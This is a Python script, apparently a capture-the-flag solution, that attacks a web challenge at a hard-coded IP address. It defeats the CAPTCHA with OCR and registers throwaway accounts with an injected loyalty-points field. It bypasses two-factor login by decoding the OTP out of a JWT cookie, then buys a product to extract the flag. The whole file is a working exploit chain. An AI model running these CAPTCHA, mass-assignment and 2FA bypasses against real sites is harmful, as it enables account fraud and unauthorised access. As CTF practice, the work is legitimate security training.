import requests
import re
import io
import subprocess
import numpy as np
import base64
import json
import random
import string
from PIL import Image

BASE = 'http://95.216.124.220:30470'

def ocr_captcha(s):
    """Résout le CAPTCHA en isolant les pixels 200 et OCR avec Tesseract"""
    r = s.get(f'{BASE}/captcha.php')
    img = Image.open(io.BytesIO(r.content)).convert('L')
    arr = np.array(img)
    clean = np.where(arr == 200, 255, 0).astype(np.uint8)
    big = Image.fromarray(clean, 'L').resize((900, 300), Image.NEAREST)
    big.save('/tmp/cap.png')
    res = subprocess.run(
        ['tesseract', '/tmp/cap.png', 'stdout', '--psm', '7',
         '-c', 'tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'],
        capture_output=True, text=True)
    return res.stdout.strip()

def decode_jwt(token):
    """Décode le payload d'un JWT (base64)"""
    p = token.split('.')[1]
    p += '=' * (-len(p) % 4)
    return json.loads(base64.b64decode(p))

for _ in range(50):
    s = requests.Session()
    user  = 'atk' + ''.join(random.choices(string.digits, k=6))
    email = user + '@pwn.io'

    cap = ocr_captcha(s)
    reg = s.post(f'{BASE}/register.php', data={
        'username':          user,
        'email':             email,
        'password':          'Str0ng!Pass1',
        'registration_code': 'I_Am_Knight',
        'captcha':           cap,
        'loyalty_points':    '500',
    }, allow_redirects=True)
    
    if 'captcha' in reg.text.lower():
        continue

    lp   = s.get(f'{BASE}/login.php')
    csrf = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', lp.text).group(1)
    s.post(f'{BASE}/login.php', data={
        'email': email,
        'password': 'Str0ng!Pass1',
        'website': '',
        'csrf_token': csrf
    }, allow_redirects=False)

    otp = decode_jwt(s.cookies.get('knight_token'))['2fa_token']
    s.post(f'{BASE}/verify_2fa.php', data={'otp': otp}, allow_redirects=True)

    d    = s.get(f'{BASE}/dashboard.php')
    csrf = re.search(r'name=["\']csrf_token["\'][^>]+value=["\']([^"\']+)["\']', d.text).group(1)
    r    = s.post(f'{BASE}/purchase.php', data={
        'product_id': '1',
        'csrf_token': csrf
    }, allow_redirects=True)

    flags = re.findall(r'CCOI26\{[^}]+\}', r.text)
    if flags:
        print(f'FLAG: {flags[0]}')
        break
